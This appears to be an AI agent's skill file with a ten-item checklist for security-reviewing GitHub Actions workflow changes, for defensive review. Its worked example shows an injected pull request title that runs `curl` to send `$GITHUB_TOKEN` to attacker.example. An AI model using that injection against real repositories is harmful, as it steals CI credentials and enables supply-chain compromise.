---
name: reviewing-workflows
description: The review lens for GitHub Actions changes — the ordered checklist of defect classes reviewers keep finding late (a fork's code run with the base repository's secrets, event text executed as shell, a token holding more than the job uses, an action pinned to a tag or an impostor commit, a cache a lower trust level can seed, a reusable workflow whose secrets do not arrive, a deploy that the next push cancels, a schedule that went dark), each with the failure scenario a finding must carry. Use when reviewing a pull request or diff that touches .github/workflows, when asked to review a workflow or an action, or as a lens in a local review round on CI changes.
---

# Reviewing GitHub Actions workflows

The preflight in `preflighting-workflows` has run, or you run it first and
paste the tables. Everything it prints is settled ground: do not re-report
an actionlint error, a zizmor audit or a structural rule row as a
finding. Your mandate is what no tool sees: whether the workflow does what
the change claims, with no more authority than the job needs, and whether
anyone outside the repository can make it do something else.

Every finding is `{file, line, severity, summary, failure_scenario}`. The
failure scenario names the actor or state and the wrong outcome. If you
cannot write one, it is not a finding. `blocking` means a stranger can run
code with the repository's token or secrets, a credential leaves the
runner, a deploy is cancelled or rolled back silently, or the workflow
cannot run at all. `minor` means it works and is fragile. Report on lines
the change touches or behaviour those lines change.

## The checklist, in the order reviewers miss them

**1. Who triggers it, and with whose token.** `pull_request_target`,
`workflow_run` and `issue_comment` run with the base repository's token
and secrets on input a stranger controls. Walk from the trigger to every
`checkout` and every `run:`: a checkout of `github.event.pull_request.head.*`
or `github.head_ref`, an `npm install` or `pip install` from that tree, a
`Makefile` target from it, is `blocking` (checkout v7 refuses the head by
default; `allow-unsafe-pr-checkout: true` in a diff is the finding). The
safe shape is `pull_request` with no secrets for the untrusted half and a
`workflow_run` job that reads artifacts only.

**2. Event text as code.** Any `${{ github.event.* }}` value an outsider
writes (PR title and body, issue and comment bodies, commit messages,
branch and label names, `github.head_ref`) inside `run:`, a
`github-script` body, or an action input that ends up in a shell, is
`blocking`: the fix is `env:` binding and a shell variable.
`workflow_dispatch` and `inputs.*` are the same class one trust level up.

**3. What the token holds.** No top-level `permissions`, or `write-all`,
or a job holding `contents: write` to run tests, or `id-token: write` on
a job that does not assume a role. Compare each job's scopes with what its
steps do; a scope no step uses is `minor`, `write-all` and a write scope
on a job that runs untrusted input is `blocking`. Since 2023-02-02 new
repositories default to read-only, so a workflow that silently relied on
the permissive default now fails on an older repository that upgraded.

**4. Pins and provenance.** Every `uses:` is a full SHA with a version
comment, or a same-repository path, or an org-internal reusable workflow
the repository's rules allow at `@main`. A tag pin is `blocking` for any
action that touches secrets or the token (the changed-files case), `minor`
otherwise. A SHA the reviewer cannot find on the upstream repository's
tags or default branch is an impostor commit and `blocking`. A Docker
image without a digest is a tag pin.

**5. Where secrets flow.** `secrets: inherit` to a callee outside the
organisation cannot work and inside it over-shares; a secret passed to a
step that echoes its inputs, writes them to a summary or an artifact, or
sets them as an output, leaves the runner (masking covers exact matches
only). A reusable-workflow chain deeper than one hop that assumes
secrets propagate finds none at the bottom.

**6. Caches across trust levels.** A cache key derived from a lockfile
hash is fine; a `restore-keys` prefix that a workflow on a lower trust
level (a `pull_request` from a fork, on the default branch) also writes
lets it seed what the privileged workflow restores and executes. Look for
the same prefix in two workflows with different triggers.

**7. The deploy that cancels itself.** `concurrency` with
`cancel-in-progress: true` on a deploy or apply job: the next push cancels
a half-done deploy. No `concurrency` on a deploy: two runs apply at once.
A job without `timeout-minutes` on a runner that can hang. `continue-on-
error` or `if: always()` on the step whose failure should stop the deploy.
A matrix with `fail-fast` masking which leg failed.

**8. The reusable contract.** Caller `with:` keys that the callee does
not declare, an output referenced through `needs` that the callee never
sets, a typed input passed as the wrong type, a callee that expects a
secret the caller does not name. Nesting at the fourth level in a
repository that may move to GitHub Enterprise Server.

**9. The schedule nobody watches.** A `schedule:` trigger that implements
a gate, a rotation or a cleanup, in a public repository with no other
keepalive, goes dark after 60 days without commits; a finding names what
the org loses when it does.

**10. Conventions the repository states.** Read its CLAUDE.md and rules
files (an org may require ID-pinned OIDC subjects, `@main` callers for
its own reusable workflows, a label that opts a PR into a gate); cite the
line. If it is not written down, it is not a convention.

## Not findings

- Anything the preflight tables already show, by rule name or audit id.
- Style: step names, job ordering, comment density, YAML quoting, unless
  the repository's rules state them.
- Missing caching, missing matrix breadth, missing summaries: performance
  and ergonomics are the author's call unless the change claims them.
- A `@main` reference to the organisation's own reusable workflow where
  the repository's rules allow it.

## Worked example

`pr-title.yml` on `pull_request_target`, a step
`run: echo "Checking ${{ github.event.pull_request.title }}"`.

```json
{"file": ".github/workflows/pr-title.yml", "line": 14, "severity": "blocking",
 "summary": "PR title interpolated into a shell line under a trigger that carries the base repository's token",
 "failure_scenario": "an outside contributor opens a PR titled `x\"; curl -d \"$GITHUB_TOKEN\" attacker.example; echo \"`; the step runs it with the base repository's write-capable token and the token leaves the runner"}
```

Checklist items 1 and 2 name the class, the scenario names the actor and
the outcome, and the fix (`env:` binding, and `pull_request` unless the
job needs the token) is in `authoring-workflows` under section 4.

## Sources

Built from the same pages as `authoring-workflows` (docs.github.com on
`pull_request_target`, security hardening, permissions, reusing
workflows, caching, limits; the GitHub Security Lab on pwn requests;
CISA and Wiz on CVE-2025-30066; the CodeQL query help on cache
poisoning) and the zizmor audit catalogue for what a tool already
reports; fetched 2026-09-29. The planted-defect fixture the tests use is
`../../tests/fixtures/planted-workflows/` with its answer key.
